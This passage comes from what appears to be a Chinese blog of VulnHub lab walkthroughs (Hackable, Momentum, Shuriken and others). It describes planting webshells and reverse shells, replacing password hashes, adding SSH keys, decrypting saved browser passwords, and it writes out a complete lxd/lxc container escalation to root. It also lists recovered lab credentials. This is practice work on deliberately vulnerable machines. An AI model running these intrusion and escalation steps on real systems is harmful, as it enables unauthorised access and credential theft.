src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135606891.png" alt="image-20210813135606891"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135936948.png" alt="image-20210813135936948"></p><blockquote><p>数据库密码hash解不出来，这里可以考虑替换hash、</p><p>123456    e10adc3949ba59abbe56e057f20f883e</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141249058.png" alt="image-20210813141249058"></p><p>登录后台</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141318613.png" alt="image-20210813141318613"></p><p>在模板处写入一句话木马 ，将该模板应用于网站，获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813142829660.png" alt="image-20210813142829660"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813143024308.png" alt="image-20210813143024308"></p><p>第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145728658.png" alt="image-20210813145728658"></p><p>将kali自带的反弹shell脚本上传到服务器，反弹shell然后执行<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>获取ttyshell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144148808.png" alt="image-20210813144148808"></p><p>在<code>/home/snape</code>下发现了登录密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144758206.png" alt="image-20210813144758206"></p><p>登录ssh</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144821901.png" alt="image-20210813144821901"></p><p>现在要么获取到<code>hermonie</code>的权限然后再获取最高权限，要么直接获取最高权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145219449.png" alt="image-20210813145219449"></p><blockquote><p>这里就明显表示需要一步一步来，先利用su_cp操作获取到hermonie，然后再获取root用户权限</p></blockquote><p>直接利用<code>su_cp</code>命令将文件复制出来 就可以获取内容了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813150540843.png" alt="image-20210813150540843"></p><blockquote><p>其他大佬是利用这个复制命令给hermonie用户添加ssh密钥</p></blockquote><p>利用kali生成密钥对，然后利用su_cp将公钥写入用户的.ssh目录</p><p>第一步生成密钥对,使用命令<code>ssh-keygen</code></p><p>第二步将公钥写入服务器中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154644825.png" alt="image-20210813154644825"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154717914.png" alt="image-20210813154717914"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154800319.png" alt="image-20210813154800319"></p><p>第三步使用私钥连接 <code>ssh hermoine@192.168.1.12 -i .ssh/id_rsa</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154905695.png" alt="image-20210813154905695"></p><p>一个厉害的提权辅助脚本<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF">https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh，可以自动收集一些信息</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">./linpeas.<span class="hljs-keyword">sh</span> | tee output<br><span class="hljs-keyword">cat</span> output | <span class="hljs-keyword">grep</span> login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813160718532.png" alt="image-20210813160718532"></p><p>解密工具：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a></p><p>使用scp命令将整个firefox的文件全部移出来（单个文件移出来，一直解码失败，所以索性全部移出）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164205265.png" alt="image-20210813164205265"></p><p>然后解码，就获得了root用户的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164109726.png" alt="image-20210813164109726"></p><p>利用密码登录到root账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164519538.png" alt="image-20210813164519538"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164540819.png" alt="image-20210813164540819"></p><p>成功获取到了第三个flag</p><p><strong>问题总结</strong></p><ol><li>为什么浏览器的登录数据中会有root用户的登录密码</li></ol><p><strong>总结</strong></p><p>这个靶场总体来说要比第一个难，主要是进攻站点时的目录扫描，http3，加入内部后的root用户密码这里，确实不走寻常路。大致步骤还是和第一个靶场类似。</p><h2 id="三、HarryPotter-Fawkes"><a href="#三、HarryPotter-Fawkes" class="headerlink" title="三、HarryPotter: Fawkes"></a><del>三、HarryPotter: Fawkes</del></h2><blockquote><p>这个是一个PWN靶场，完全后面几步没头绪</p></blockquote><blockquote><p>靶场：192.168.1.101</p><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>3个flag</p></blockquote><p>扫描端口，这个开的端口还挺多的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813171526501.png" alt="image-20210813171526501"></p><p>ftp中只有一个文件，但是打开乱码，先留着应该有用</p><p><code>EtherNetIP-1</code>：工业以太网通讯协议，可以应用再程序控制及其他自动化的应用中，是通用工业协定的一部分</p><p><code>monkeycom</code>：视频电话/文件传输程序</p><p>扫描目录，结果什么东西都没有</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814124812344.png" alt="image-20210814124812344"></p><p>挨个访问一下这几个端口，但是都没有什么东西:cry: ，卡住了，看了一眼国外的大佬的步骤，确实是要访问这几个端口的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125206654.png" alt="image-20210814125206654"></p><p>curl一下，发现提示HTTP/0.9的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125229195.png" alt="image-20210814125229195"></p><p>指定好http的版本就可以正常返回了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125917891.png" alt="image-20210814125917891"></p><p>参考文章</p><p><a href="https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/</a></p><h2 id="三、HACKABLE-II"><a href="#三、HACKABLE-II" class="headerlink" title="三、HACKABLE: II"></a>三、HACKABLE: II</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.13</p></blockquote><p>扫描靶机位置和靶机开放的端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134501443.png" alt="image-20210814134501443"></p><p>访问一下各个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134636446.png" alt="image-20210814134636446"></p><p>ftp中的内容，这个提示内容没怎么懂…………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134752215.png" alt="image-20210814134752215"></p><p>扫描一下目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814135029124.png" alt="image-20210814135029124"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140003974.png" alt="image-20210814140003974"></p><blockquote><p>这个文件和ftp中的文件存储位置是一样的，所以我们可以通过ftp上传shell</p></blockquote><p>访问上传的反弹shell的php文件就可以获得shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140350228.png" alt="image-20210814140350228"></p><p>获取ttyshell的<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>，发现一个重要的文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814143719614.png" alt="image-20210814143719614"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144303223.png" alt="image-20210814144303223"></p><p>尝试ssh登录，shrek账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144608483.png" alt="image-20210814144608483"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150109583.png" alt="image-20210814150109583"></p><p>准备收集信息提权</p><ul><li><del>SUID提权</del></li><li><del>sudo提权（版本不适配）</del></li><li><del>定时任务提权</del></li></ul><blockquote><p>后面没事就突然想起来看了一下.bash_history文件</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150300644.png" alt="image-20210814150300644"></p><p>也模仿执行了一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150351118.png" alt="image-20210814150351118"></p><p>提权成功，幸福来得太突然了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150425717.png" alt="image-20210814150425717"></p><p><strong>总结</strong></p><p>这个靶场的整体难度可以说是没有难度…………适合玩玩而已</p><h2 id="四、Hackable-III"><a href="#四、Hackable-III" class="headerlink" title="四、Hackable: III"></a>四、Hackable: III</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.16</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154534969.png" alt="image-20210814154534969"></p><blockquote><p>只开放了一个端口，有点少啊</p></blockquote><p>扫描目录获取更多有用的信息</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154857267.png" alt="image-20210814154857267"></p><p>网页源码有一段注释，这个应该是一个提示，但是有点看不懂</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814180322841.png" alt="image-20210814180322841"></p><p>在<code>/backup/wordlist.txt</code>中是一个字典，可能对后面爆破有用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155354912.png" alt="image-20210814155354912"></p><p>这个编码真的没见过，看了一下WP才知道到<a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814181115898.png" alt="image-20210814181115898"></p><p>数据库无密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155452250.png" alt="image-20210814155452250"></p><p>登录页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155638016.png" alt="image-20210814155638016"></p><blockquote><p>一看源码就感觉有SQL注入</p></blockquote><p>登录页面为<code>/login_page/login.html</code>，发现没有SQL注入，但是可以访问上面的图片<code>3.jpg</code>，前面1，2都有了，这个<code>3.jpg</code> ，应该也有东西，那就应该是misc的图片隐写</p><p>图片隐写工具：<a href="http://steghide.sourceforge.net/download.php">http://steghide.sourceforge.net/download.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814183500775.png" alt="image-20210814183500775"></p><blockquote><p>拿到了3个数字  10000  4444  65535</p><p>不知道有什么用:pensive:</p></blockquote><p>使用端口碰撞后发现22端口已经打开了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814184715476.png" alt="image-20210814184715476"></p><p>现在手里有的东西并且还没有用的线索就是那个字典，然后最新获得了一个22端口，所以就爆破一下ssh密码，用户名目前出现的名字就是第一个网页源码的提示中的名字，先试一下吧…………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185708000.png" alt="image-20210814185708000"></p><p>使用ssh登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185911017.png" alt="image-20210814185911017"></p><p>查看home目录发现应该是有两个用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816093110878.png" alt="image-20210816093110878"></p><p>获取到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814190000585.png" alt="image-20210814190000585"></p><p>找一下敏感文件，在web目录下发现一个配置文件，里面有一个用户名和密码，尝试一下成功登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814192615628.png" alt="image-20210814192615628"></p><p>提权</p><ul><li><p><del>SUID提权</del></p></li><li><p><del>sudo提权</del></p></li><li><p><del>定时任务提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101848774.png" alt="image-20210816101848774"></p><blockquote><p>存在一个以管理员身份定时执行的python脚本</p></blockquote><p>在文件夹下面未发现那个文件？？？？自己删自己吗？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101950544.png" alt="image-20210816101950544"></p><p>也不能自己写文件</p><blockquote><p>后面看见有一个人是用的定时任务提权</p><p><a href="https://kerszl.github.io/hacking/walkthrough/hackable-iii/">https://kerszl.github.io/hacking/walkthrough/hackable-iii/</a></p><p>不懂为什么他直接猜出来了文件内容？？？</p></blockquote></li><li><p><del>内核漏洞提权</del> 先留着最后使用</p></li><li><p>lxd / lxc 提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816103421953.png" alt="image-20210816103421953"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">在kali攻击机上构建<br>git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/saghul/</span>lxd-alpine-builder.git<br>cd lxd-alpine-builder<br>./build-alpine<br></code></pre></td></tr></table></figure><p>构建好了之后利用scp命令将文件移动到靶机上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104808086.png" alt="image-20210816104808086"></p><p>导入<code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage</code></p><p>查看<code>lxc image list</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105315274.png" alt="image-20210816105315274"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">漏洞靶机<br>lxd init<br>lxc init myimage ignite -c security.<span class="hljs-attribute">privileged</span>=<span class="hljs-literal">true</span><br>lxc<span class="hljs-built_in"> config </span>device <span class="hljs-builtin-name">add</span> ignite mydevice disk <span class="hljs-attribute">source</span>=/ <span class="hljs-attribute">path</span>=/mnt/root <span class="hljs-attribute">recursive</span>=<span class="hljs-literal">true</span><br>lxc start ignite<br>lxc exec ignite /bin/sh<br>之后就是root用户了，可以进入/mnt/root目录操作主机的所有目录<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105230095.png" alt="image-20210816105230095"></p></li></ul><p>  <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104600712.png" alt="image-20210816104600712"></p><p><strong>总结</strong></p><ol><li><p>学习到的新东西：端口隐藏和端口碰撞 </p><p>端口碰撞技术是一种允许服务设备在用户按照约定的序列碰撞后，打开一个约定的服务端口提供服务的技术。所谓碰撞是由一个尝试访问系统中关闭端口的序列组成，也就是特定端口的连接请求</p><p><a href="https://zhuanlan.zhihu.com/p/210177505">https://zhuanlan.zhihu.com/p/210177505</a>  </p><p><a href="https://www.cnblogs.com/milton/p/14121214.html">https://www.cnblogs.com/milton/p/14121214.html</a></p></li><li><p>lxd /  lxc  提权</p><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p><p><a href="https://www.freebuf.com/articles/system/216803.html">https://www.freebuf.com/articles/system/216803.html</a></p></li></ol><p>参考文章</p><p><a href="https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/">https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/</a></p><h2 id="五、-Momentum-1"><a href="#五、-Momentum-1" class="headerlink" title="五、 Momentum: 1"></a>五、 Momentum: 1</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.17</p></blockquote><p>扫描主机ip和端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111017698.png" alt="image-20210816111017698"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111319784.png" alt="image-20210816111319784"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111850304.png" alt="image-20210816111850304"></p><p>首页存在XSS</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111726937.png" alt="image-20210816111726937"></p><p><code>cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111959176.png" alt="image-20210816111959176"></p><blockquote><p>也可以直接F12查看cookie</p></blockquote><p> 解密Cookie：<code>auxerre-alienum##</code> 不知道有什么用</p><p><a href="https://tool.oschina.net/encrypt/">https://tool.oschina.net/encrypt/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816114927619.png" alt="image-20210816114927619"></p><ul><li><p><del>查找网站后台尝试密码</del>（没找到后台）</p></li><li><p>登录ssh</p><p>成功登录，用户名：<code>auxerre</code> 密码：<code>auxerre-alienum##</code>（多次 尝试就可以了）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115136551.png" alt="image-20210816115136551"></p></li></ul><p>得到第一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115329865.png" alt="image-20210816115329865"></p><p>提权</p><ul><li><p><del>SUID提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115514097.png" alt="image-20210816115514097"></p></li><li><p><del>sudo提权</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115602155.png" alt="image-20210816115602155"></p></li><li><p><del>定时任务提权</del>（也没有）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115904460.png" alt="image-20210816115904460"></p><p>但是发现了一个redis</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120155248.png" alt="image-20210816120155248"></p><p>连接上redis，然后查询所有的key，使用get获取指定key的值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120415536.png" alt="image-20210816120415536"></p><p>通过redis发现了root用户的密码</p><p>尝试直接登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120546646.png" alt="image-20210816120546646"></p><p>成功获取flag</p><blockquote><p>对于Redis的操作不熟悉，需要加强</p></blockquote></li></ul><p><strong>总结</strong></p><p>这个靶场整体思路比较简单，如果想到了就容易做，但是如果思路不对就容易卡死。由Cookie解密获得ssh登录的信息（这个现实应该不会有吧），利用redis获取到root用户的密码</p><h2 id="六、MOMENTUM-2"><a href="#六、MOMENTUM-2" class="headerlink" title="六、MOMENTUM: 2"></a>六、MOMENTUM: 2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.19</p></blockquote><p>扫描主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135219734.png" alt="image-20210816135219734"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135728304.png" alt="image-20210816135728304"></p><p>发现一个文件上传点和文件上传的逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"># /js/main.js<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadFile</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">var</span> files = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;file&quot;</span>).files;<br> <br>    <span class="hljs-keyword">if</span>(files.length &gt; <span class="hljs-number">0</span> )&#123;<br> <br>       <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> FormData();<br>       formData.append(<span class="hljs-string">&quot;file&quot;</span>, files[<span class="hljs-number">0</span>]);<br> <br>       <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();<br> <br>       <span class="hljs-comment">// Set POST method and ajax file path</span><br>       xhttp.open(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;ajax.php&quot;</span>, <span class="hljs-literal">true</span>);<br> <br>       <span class="hljs-comment">// call on request changes state</span><br>       xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.readyState == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-built_in">this</span>.status == <span class="hljs-number">200</span>) &#123;<br> <br>            <span class="hljs-keyword">var</span> response = <span class="hljs-built_in">this</span>.responseText;<br>            <span class="hljs-keyword">if</span>(response == <span class="hljs-number">1</span>)&#123;<br>               alert(<span class="hljs-string">&quot;Upload successfully.&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>               alert(<span class="hljs-string">&quot;File not uploaded.&quot;</span>);<br>            &#125;<br>          &#125;<br>       &#125;;<br> <br>       <span class="hljs-comment">// Send request with data</span><br>       xhttp.send(formData);<br> <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;Please select a file&quot;</span>);<br>    &#125;<br> <br> &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135752058.png" alt="image-20210816135752058"></p><p>尝试上传文件获取shell</p><p>可以上传txt文件，然后上传的文件都在<code>/owls</code>中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816141536270.png" alt="image-20210816141536270"></p><p>目前没有头绪了，看了一眼WP，知道了还有一个备份文件<code>ajax.php.bak</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">//</span>The boss told me to add one more Upper Case letter at the end of the cookie<br> <span class="hljs-regexp">//</span>  在最后添加一个大写字母<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-string">&#x27;&amp;G6u@B6uDXMq&amp;Ms&#x27;</span>)&#123;<br>    <span class="hljs-regexp">//</span>[+] Add <span class="hljs-keyword">if</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;secure&#x27;</span>] == <span class="hljs-string">&#x27;val1d&#x27;</span><br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;pdf&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><br><span class="hljs-regexp">//</span> Remember success upload returns <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>选择发送文件，然后再添加在post中发送一个值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145535200.png" alt="image-20210816145535200"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145648277.png" alt="image-20210816145648277"></p><p>上传成功，获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150152446.png" alt="image-20210816150152446"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150234824.png" alt="image-20210816150234824"></p><p>同时获得了一个用户的密码是<code>myvulnerableapp*</code> （最后这个居然是一个编码的，试了半天）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150912680.png" alt="image-20210816150912680"></p><p>提权</p><ul><li><p><del>SUID提权</del> （无）</p></li><li><p><del>SUDO提权</del>（好像存在）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816152204121.png" alt="image-20210816152204121"></p></li><li><p><del>定时程序提权</del> 使用pspy64监控进程发现没有可利用的</p></li><li><p>查看本地提示文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153103729.png" alt="image-20210816153103729"></p><p>用户可以以管理员权限执行这个文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154331065.png" alt="image-20210816154331065"></p><p>代码的命令执行漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153305188.png" alt="image-20210816153305188"></p><p>这个服务器居然装了nc的，尝试直接反弹shell没有反应</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154151777.png" alt="image-20210816154151777"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154129539.png" alt="image-20210816154129539"></p></li></ul><p><strong>问题</strong></p><ol><li><p>反弹shell命令失败，</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816155406823.png" alt="image-20210816155406823"></p></li></ol><p><strong>总结</strong></p><ol><li>我们需要充分利用已有的信息</li><li>对于提权，我们还是需要仔细查看系统中的内容</li><li>灵活运用系统漏洞</li></ol><p>参考</p><p><a href="https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/</a></p><p><a href="https://blog.csdn.net/qq_39991837/article/details/118596117">https://blog.csdn.net/qq_39991837/article/details/118596117</a></p><h2 id="七、Shuriken-1"><a href="#七、Shuriken-1" class="headerlink" title="七、Shuriken-1"></a>七、Shuriken-1</h2><blockquote><p>kali：192.168.1.15</p><p>win10： 192.168.1.7</p><p>靶机：192.168.1.115</p></blockquote><p>扫描主机和端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816165809786.png" alt="image-20210816165809786"></p><p>目录扫描</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816170051795.png" alt="image-20210816170051795"></p><p>有一个<code>secrete.png</code>这个是图片隐写吗？？？尝试之前的图片隐写操作结果失败</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816172553131.png" alt="image-20210816172553131"></p><p>修改本地hosts文件，就可以通过域名访问网站了，在这个地方就卡住了，然后看了一眼大师傅们的WP原来这里有个利用伪协议读取本地文件的漏洞</p><p>第一个域名访问是需要认证的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816174007524.png" alt="image-20210816174007524"></p><p>第二个存在文件读取漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173232653.png" alt="image-20210816173232653"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173147515.png" alt="image-20210816173147515"></p><blockquote><p>猜测可以通过读取文件来获得账户密码</p></blockquote><p>Apache的密码会存储在一个<code>.htpasswd</code>文件中，并且在<code>httpd.conf</code>中会保存密码文件的路径</p><p><a href="https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/">https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/</a></p><p>找这个路径是最要命的</p><p><a href="https://blog.csdn.net/bujidexinq/article/details/27187761">https://blog.csdn.net/bujidexinq/article/details/27187761</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816175709403.png" alt="image-20210816175709403"></p><p><img src="D:\markdown\image-20210816175643812.png" alt="image-20210816175643812"></p><blockquote><p>接下来需要解密这个密码</p><p>加密原理：<a href="https://www.cnblogs.com/LuckyOven/p/13614981.html">https://www.cnblogs.com/LuckyOven/p/13614981.html</a></p></blockquote><p>用户：developers 密码：9972761drmfsls</p><p>成功登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816181920197.png" alt="image-20210816181920197"></p><p>在漏洞库中找到了相关漏洞<a href="https://www.exploit-db.com/exploits/44250">https://www.exploit-db.com/exploits/44250</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816182732537.png" alt="image-20210816182732537"></p><p>直接上传不行，还需要传入用户名和密码来验证</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183546486.png" alt="image-20210816183546486"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183603060.png" alt="image-20210816183603060"></p><p>显示出自己的权限，这里显示可以以<code>server-management</code>的身份执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817092434784.png" alt="image-20210817092434784"></p><p>提权到<code>server-management</code>用户</p><p><img 